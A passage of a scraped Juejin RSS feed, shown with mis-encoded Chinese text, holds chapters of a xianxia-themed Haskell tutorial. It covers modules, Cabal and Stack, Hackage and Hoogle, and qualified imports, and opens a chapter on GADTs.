<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> ç‚¼è™šä¹‹åï¼Œéœ€<strong>åˆä½“</strong>ã€‚æˆ‘ä»¬å°†å­¦ä¹ <strong>æ¨¡å—åŒ–ä¸åŒ…ç®¡ç†ï¼ˆModules &amp; Cabalï¼‰</strong> ã€‚ä½ å°†èµ°å‡ºé—­å…³çš„æ´åºœï¼Œå­¦ä¹ å¦‚ä½•å€Ÿç”¨åƒä¸‡é“å‹ç•™ä¸‹çš„â€œè—ç»é˜â€ï¼ˆHackageï¼‰ï¼Œæ„å»ºçœŸæ­£çš„ç»ä¸–æ³•é˜µã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬å…«ç« ï¼šä¸‡æµå½’å®—ä¸å¼€å®—ç«‹æ´¾]]></title>    <link>https://juejin.cn/post/7589181008098967567</link>    <guid>https://juejin.cn/post/7589181008098967567</guid>    <pubDate>2025-12-30T02:45:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589181008098967567" data-draft-id="7589181008098951183" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬å…«ç« ï¼šä¸‡æµå½’å®—ä¸å¼€å®—ç«‹æ´¾"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:45:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬å…«ç« ï¼šä¸‡æµå½’å®—ä¸å¼€å®—ç«‹æ´¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:45:19.000Z" title="Tue Dec 30 2025 02:45:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¬¢è¿é“å‹æ¥åˆ°<strong>ç¬¬å…«ç« </strong>ã€‚</p>
<p>ç»è¿‡â€œç‚¼è™šæœŸâ€å¯¹æ— é™ä¸æƒ°æ€§çš„æ„Ÿæ‚Ÿï¼Œä½ å·²ç»èƒ½å¤Ÿåœ¨é‚£è™šæ— ç¼¥ç¼ˆçš„ Thunk ä¸­æ•æ‰çœŸç†ã€‚ç„¶è€Œï¼Œä¸€ä¸ªäººçš„ä¿®è¡Œç»ˆç©¶æ˜¯å­¤ç‹¬çš„ã€‚æƒ³è¦ç‚¼åˆ¶å‡ºéœ‡åŠ¨ä¹å¤©çš„â€œç»ä¸–ä»™é˜µâ€ï¼ˆå¤§å‹å·¥ç¨‹ï¼‰ï¼Œä½ ä¸èƒ½å‡¡äº‹éƒ½äº²åŠ›äº²ä¸ºã€‚</p>
<p>ä»Šæ—¥ï¼Œæˆ‘ä»¬è¦è¿ˆå…¥<strong>åˆä½“æœŸï¼šä¸‡æµå½’å®—ï¼ˆModules &amp; Ecosystemï¼‰</strong> ã€‚åœ¨è¿™ä¸€å±‚å¢ƒç•Œï¼Œä½ å°†å­¦ä¼šå¦‚ä½•å¼€è¾Ÿè‡ªå·±çš„â€œæ´åºœåˆ†é™¢â€ï¼Œå¹¶å­¦ä¼šå€Ÿç”¨ä¸‡åƒé“å‹ç•™åœ¨**â€œè—ç»é˜ï¼ˆHackageï¼‰â€**ä¸­çš„é€šå¤©ç§˜å®ã€‚</p>
<hr/>
<p>åœ¨ä¿®ä»™ç•Œï¼ŒçœŸæ­£çš„å¼ºè€…ä»ä¸è‡ªå·±æ‰‹åŠ¨å®ç°æ¯ä¸€ä¸ªå“ˆå¸Œè¡¨æˆ–è§£æå™¨ã€‚ä»–ä»¬æ‡‚å¾—ç¥­å‡º**â€œå¬å”¤æœ¯â€**ï¼Œå°†å‰äººçš„é“æœåŒ–ä¸ºå·±ç”¨ã€‚</p>
<h3 data-id="heading-0">8.1 æ´åºœåˆ†åŒ–ï¼šModuleï¼ˆæ¨¡å—ç³»ç»Ÿï¼‰</h3>
<p>éšç€ä½ çš„æ³•æœ¯ï¼ˆä»£ç ï¼‰è¶Šæ¥è¶Šå¤šï¼Œå¦‚æœå †åœ¨ä¸€ä¸ªå·è½´é‡Œï¼Œéš¾å…ä¼šäº§ç”Ÿ**â€œçµæ°”å†²çªâ€**ã€‚ä½ éœ€è¦å°†å®ƒä»¬æ‹†åˆ†åˆ°ä¸åŒçš„å³°å¤´ã€‚</p>
<ul>
<li><strong>å®šä¹‰å³°å¤´ï¼š</strong></li>
</ul>
<p>Haskell</p>
<pre><code class="hljs language-rust" lang="rust">module LingXian.<span class="hljs-title function_ invoke__">Alchemy</span> (ç…‰ä¸¹æœ¯, ç‚¸ç‚‰) <span class="hljs-keyword">where</span>

ç…‰ä¸¹æœ¯ :: Material <span class="hljs-punctuation">-&gt;</span> Pill
ç…‰ä¸¹æœ¯ = ...

ç‚¸ç‚‰ :: <span class="hljs-type">String</span>
ç‚¸ç‚‰ = <span class="hljs-string">"ç °ï¼"</span>
</code></pre>
<ul>
<li>
<p>å¼•å…¥ä¼ æ‰¿ï¼š</p>
<p>å½“ä½ åœ¨ä¸»å³°ä¿®è¡Œæ—¶ï¼Œåªéœ€ä¸€çº¸æ–‡ä¹¦ä¾¿å¯è°ƒç”¨ï¼š</p>
</li>
</ul>
<p>Haskell</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> LingXian.<span class="hljs-built_in">Alchemy</span> (ç…‰ä¸¹æœ¯) -- åªå–æ‰€éœ€ï¼Œä¸æ²¾å› æœ
</code></pre>
<hr/>
<h3 data-id="heading-1">8.2 é•‡å®—ç¥å…½ï¼šCabal ä¸ Stack</h3>
<p>åœ¨å‡¡é—´ï¼Œç®¡ç†ä¾èµ–æ˜¯ä¸€ä»¶è‹¦å·®äº‹ã€‚è€Œåœ¨ Î» é—¨ï¼Œæˆ‘ä»¬æœ‰ä¸¤å¤´ç¥å…½å®ˆæŠ¤ç€å®—é—¨çš„ç§©åºï¼š<strong>Cabal</strong> ä¸ <strong>Stack</strong>ã€‚å®ƒä»¬è´Ÿè´£ç¡®ä¿ä½ å¼•å…¥çš„æ³•å®ä¹‹é—´ä¸ä¼šäº§ç”Ÿâ€œå±æ€§ç›¸å…‹â€ï¼ˆç‰ˆæœ¬å†²çªï¼‰ã€‚</p>
<ul>
<li><strong>Cabalï¼š</strong> å¤è€çš„æŠ¤æ³•ç¥ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œèƒ½å¤„ç†æœ€å¤æ‚çš„å› æœé“¾æ¡ã€‚</li>
<li><strong>Stackï¼š</strong> åèµ·ä¹‹ç§€ï¼Œä¸»æ‰“â€œç¨³å®šâ€ã€‚å®ƒä¼šä¸ºä½ é€‰å®šä¸€ä¸ªç‰¹å®šçš„â€œä¿®ä»™çºªå…ƒâ€ï¼ˆResolverï¼‰ï¼Œç¡®ä¿åœ¨è¯¥çºªå…ƒä¸‹çš„æ‰€æœ‰æ³•å®éƒ½èƒ½å®Œç¾å¥‘åˆã€‚</li>
</ul>
<blockquote>
<p><strong>å¿ƒæ³•ï¼š</strong> <code>stack build</code> ä¸€å‡ºï¼Œå¤©åœ°çµæ°”è‡ªåŠ¨æ±‡èšï¼Œæ‰€æœ‰ä¾èµ–è‡ªåŠ¨å½’ä½ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">8.3 è—ç»é˜ï¼šHackage ä¸ Hoogle</h3>
<ul>
<li>
<p><strong>Hackageï¼š</strong> è¿™æ˜¯ Î» é—¨çš„å…¬å…±è—ç»é˜ï¼Œé‡Œé¢å­˜æ”¾ç€æ•°ä»¥ä¸‡è®¡çš„åº“ã€‚æ— è®ºæ˜¯å¤„ç†æ–‡å­—ã€å›¾å½¢è¿˜æ˜¯é«˜ç»´æ•°å­¦ï¼Œè¿™é‡Œéƒ½æœ‰é“å‹ç•™ä¸‹çš„ç§˜ç±ã€‚</p>
</li>
<li>
<p><strong>Hoogleï¼ˆç¥è¯†æœç´¢ï¼‰ï¼š</strong> è¿™æ˜¯ä¿®ä»™ç•Œæœ€ç¥å¥‡çš„æœç´¢å¼•æ“ã€‚ä½ ä¸ä»…å¯ä»¥ç”¨åå­—æœï¼Œè¿˜å¯ä»¥ç”¨**â€œæ³•æœ¯ç­¾åâ€**æœã€‚</p>
<ul>
<li><em>ç¤ºä¾‹ï¼š</em> ä½ æƒ³æ‰¾ä¸€ä¸ªâ€œèƒ½æŠŠåˆ—è¡¨åè½¬â€çš„æ³•æœ¯ï¼Œåªéœ€åœ¨ Hoogle è¾“å…¥ <code>[a] -&gt; [a]</code>ï¼Œå®ƒä¾¿ä¼šå‘Šè¯‰ä½ é‚£å« <code>reverse</code>ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-3">8.4 ç§˜æœ¯ï¼šQualified Importï¼ˆå®šç‚¹å¬å”¤ï¼‰</h3>
<p>æœ‰æ—¶å€™ï¼Œä¸¤ä¸ªå®—é—¨éƒ½æœ‰åŒåçš„æ³•æœ¯ï¼ˆæ¯”å¦‚ <code>Data.Map.filter</code> å’Œ <code>Prelude.filter</code>ï¼‰ã€‚ä¸ºäº†é˜²æ­¢èµ°ç«å…¥é­”ï¼Œæˆ‘ä»¬éœ€è¦<strong>å®šç‚¹å¬å”¤</strong>ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> qualified Data.Map <span class="hljs-keyword">as</span> M

-- ä½¿ç”¨æ—¶å¿…é¡»å¸¦ä¸Šå°å·
M.<span class="hljs-built_in">filter</span> (\v -&gt; v &gt; <span class="hljs-number">0</span>) myMap
</code></pre>
<hr/>
<h2 data-id="heading-4">âš¡ åˆä½“å¿ƒå¾—ï¼šä¸è¦é‡å¤é€ è½®å­</h2>
<p>è¿›å…¥åˆä½“æœŸåï¼Œä½ çš„ä¿®è¡Œé‡ç‚¹åº”ä»â€œå¦‚ä½•å†™ä»£ç â€è½¬å‘**â€œå¦‚ä½•ç»„åˆé€»è¾‘â€**ã€‚</p>
<ol>
<li><strong>åˆ†æ²»æ³•ï¼š</strong> å¤æ‚çš„é€»è¾‘æ‹†åˆ†åˆ°ä¸åŒæ¨¡å—ï¼Œä¿æŒæ¯ä¸ªæ¨¡å—çš„å› æœç®€å•ã€‚</li>
<li><strong>å–„ç”¨å·¥å…·ï¼š</strong> é‡åˆ°éš¾é¢˜ï¼Œå…ˆå» Hoogle æœç´¢ç±»å‹ç­¾åï¼Œå¾€å¾€å‰äººå·²ç»ä¸ºä½ ç‚¼å¥½äº†ç°æˆçš„ä¸¹è¯ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-5">ğŸ“œ åˆä½“è¯•ç‚¼ï¼šç¬¬å…«å…³</h2>
<p>è¯·å°è¯•åœ¨ä½ çš„å®—é—¨ä¸­å»ºç«‹åˆæ­¥çš„ç§©åºï¼š</p>
<ol>
<li><strong>å¼€è¾Ÿåˆ†é™¢ï¼š</strong> åˆ›å»ºä¸€ä¸ªåä¸º <code>Geometry.hs</code> çš„æ–‡ä»¶ï¼Œå®šä¹‰ä¸€ä¸ª <code>module Geometry</code>ï¼ŒåŒ…å«è®¡ç®—åœ†é¢ç§¯çš„å‡½æ•° <code>circleArea</code>ã€‚</li>
<li><strong>è·¨å³°è°ƒç”¨ï¼š</strong> åœ¨ä½ çš„ <code>Main.hs</code> ä¸­ <code>import Geometry</code> å¹¶è°ƒç”¨è¯¥å‡½æ•°ã€‚</li>
<li><strong>ç¥è¯†æœç´¢ï¼š</strong> å°è¯•è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fhoogle.haskell.org%2F" target="_blank" title="https://hoogle.haskell.org/" ref="nofollow noopener noreferrer">Hoogle</a>ï¼Œæœç´¢ç±»å‹ç­¾å <code>(a -&gt; b) -&gt; [a] -&gt; [b]</code>ï¼Œçœ‹çœ‹å®ƒä¼šè¿”å›å“ªä¸ªä½ å·²ç»å­¦è¿‡çš„â€œæ³•å®â€ï¼Ÿ</li>
</ol>
<p><strong>â€œä¸å†æ˜¯å•æ‰“ç‹¬æ–—ï¼Œè€Œæ˜¯ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šä¿¯ç°è‹ç”Ÿã€‚æ­å–œé“å‹ï¼Œåˆä½“æœŸæˆï¼Œè¿™ä¸–é—´å·²å°‘æœ‰èƒ½éš¾ä½ä½ çš„é€»è¾‘äº†ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> ç»ˆäºâ€¦â€¦æˆ‘ä»¬è¦è§¦ç¢°é‚£ä¼ è¯´ä¸­â€œåŠæ­¥å¤§ä¹˜â€çš„é¢†åŸŸäº†â€”â€”<strong>ç¬¬ä¹ç« ï¼šå¤§ä¹˜æœŸï¼šç±»å‹é»‘é­”æ³•ï¼ˆGADTs &amp; Type Familiesï¼‰</strong> ã€‚æˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•è®©ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æœŸä¸ºä½ â€œæ¨æ¼”å¤©æœºâ€ï¼Œç”šè‡³åœ¨ç¨‹åºè¿è¡Œå‰å°±è¯æ˜å®ƒçš„ç»å¯¹æ­£ç¡®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬ä¹ç« ï¼šç±»å‹é»‘é­”æ³•ä¸æ¨æ¼”å¤©æœº]]></title>    <link>https://juejin.cn/post/7589181008098983951</link>    <guid>https://juejin.cn/post/7589181008098983951</guid>    <pubDate>2025-12-30T02:46:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589181008098983951" data-draft-id="7589186347585388578" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬ä¹ç« ï¼šç±»å‹é»‘é­”æ³•ä¸æ¨æ¼”å¤©æœº"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:46:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬ä¹ç« ï¼šç±»å‹é»‘é­”æ³•ä¸æ¨æ¼”å¤©æœº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:46:30.000Z" title="Tue Dec 30 2025 02:46:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¬¢è¿é“å‹æ¥åˆ°<strong>ç¬¬ä¹ç« </strong>ã€‚</p>
<p>ä½ èƒ½èµ°åˆ°è¿™é‡Œï¼Œè¯´æ˜ä½ çš„é“å¿ƒå·²åšå¦‚ç£çŸ³ã€‚åœ¨ä¹‹å‰çš„å¢ƒç•Œä¸­ï¼Œä½ å·²ç»æŒæ¡äº†é€»è¾‘çš„ç»„åˆã€å› æœçš„ä¼ é€’ä»¥åŠæ— é™çš„æ“æ§ã€‚ä½†é‚£å¤§å¤šè¿˜æ˜¯åœ¨â€œå€¼ï¼ˆValueï¼‰â€çš„å±‚é¢è…¾æŒªã€‚</p>
<p>ä»Šæ—¥ï¼Œæˆ‘ä»¬è¦ç ´å¼€è™šç©ºï¼Œè¿›å…¥<strong>å¤§ä¹˜æœŸï¼šç±»å‹é»‘é­”æ³•ï¼ˆType Meta-programmingï¼‰</strong> ã€‚åœ¨è¿™ä¸€å±‚ï¼Œä½ å°†ä¸å†ä»…ä»…æ˜¯ç¼–å†™ç¨‹åºï¼Œä½ æ˜¯åœ¨**â€œç¼–å†™é€»è¾‘çš„æ³•å¾‹â€**ã€‚ä½ å°†èµ‹äºˆç±»å‹ç³»ç»Ÿè‡ªæˆ‘æ€è€ƒã€è‡ªæˆ‘æ¨æ¼”çš„èƒ½åŠ›ï¼Œå®ç°çœŸæ­£çš„â€œä¸å‡ºæˆ·ï¼ŒçŸ¥å¤©ä¸‹â€ã€‚</p>
<hr/>
<p>åœ¨ Î» é—¨çš„æœ€é«˜æ®¿å ‚é‡Œï¼Œæœ‰ä¸€æ¡çœŸç†ï¼š <strong>â€œç±»å‹å³è¯æ˜ï¼ˆPropositions as Typesï¼‰â€</strong> ã€‚å¤§ä¹˜æœŸçš„ä¿®ä»™è€…è¿½æ±‚çš„æ˜¯ï¼šé€šè¿‡ç²¾å·§çš„ç±»å‹è®¾è®¡ï¼Œè®©ç¨‹åºåœ¨ç¼–è¯‘é˜¶æ®µå°±è‡ªåŠ¨è¯æ˜è‡ªå·±çš„æ­£ç¡®æ€§ã€‚</p>
<h3 data-id="heading-0">9.1 å¤©çº²é‡å¡‘ï¼šGADTsï¼ˆå¹¿ä¹‰ä»£æ•°æ•°æ®ç±»å‹ï¼‰</h3>
